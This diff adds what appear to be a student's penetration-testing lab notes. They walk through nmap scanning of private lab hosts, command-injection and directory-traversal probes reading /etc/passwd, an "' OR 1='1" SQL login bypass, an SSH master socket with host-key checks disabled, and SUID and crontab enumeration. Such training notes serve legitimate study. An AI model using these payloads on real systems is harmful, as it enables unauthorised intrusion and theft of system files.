@@ -673,8 +673,39 @@ event IDs 4624,4625 success and fail
 event viewer use to to look at system logs 
 
 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
+DTY RUN TEST 
+
+
+
+extra
+-----------
+upoload file
+go to robots.txt
+go to my uploaded file 
+
+**************************************
+*2 types of encoding rot13 and base64*
+***************************************
+
+
+DRY RUN steps
+---------------
+ping sweep for a large subnet and then do nmap for individuals 
+1) nmap -v -sT -Pn -T4 -sV 10.50.45.7
+2) saw port 80 so i did: nmap -v -sT -Pn -T4 -sV --script=http-enum.nse 10.50.41.7 -p 80
+3) go to the website
+4) download everything from top to bottom of the website, click on everything enumorate everything.
+5) try command injection: ; whoami , or traversal ../../../../../../../../../etc/passwd, or sql Tom ' OR 1='1 
+6) sees its direcory traversal doing: ../../../../../../../../../etc/passwd
+7) does another traversal ./../../../../../../../../etc/hosts -> sees a new host means we gotta scan when we get to that box
+8) goes to sign in does tom ' or 1='1 in the user pass thats the post;
+9)  the get method is putting it in the url, go via F12, go to network click on post, then request click raw form
+10)  make a master socket to the first box: ssh -M -S /tmp/grey  -o StrictHostKeyChecking=no -o UserKnownHostFile=/dev/null user2@10.50.41.7
+11)  run sudo -l, and find / -type f -perm /6000 -ls  2> /dev/null
+12)  cat /etc/hosts, /etc/passwd, /etc/crontab,
 
 
 
